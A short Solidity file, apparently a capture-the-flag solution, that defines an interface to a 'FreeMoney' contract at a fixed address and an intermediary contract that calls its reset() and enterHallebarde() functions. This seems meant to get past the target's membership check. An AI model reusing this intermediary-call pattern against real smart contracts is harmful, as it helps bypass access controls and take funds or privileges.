pragma solidity 0.7.6;

interface IFreeMoney {
    function getMoney(uint256 numTokens) external;
    function reset() external;
    function transfer(address receiver, uint256 numTokens) external returns (bool);
    function enterHallebarde() external;
    function getMembershipStatus(address memberAddress) external view returns (bool);
}

contract TriggerTransaction {
    address private _owner;
    address constant _contract_address = 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6;
    IFreeMoney _contract = IFreeMoney(_contract_address);


    constructor() {
        _owner = msg.sender;
        
        _contract.reset();
    }

    function trigger() public {
        require(msg.sender == _owner, "who are you ?");

        _contract.enterHallebarde();
    }
}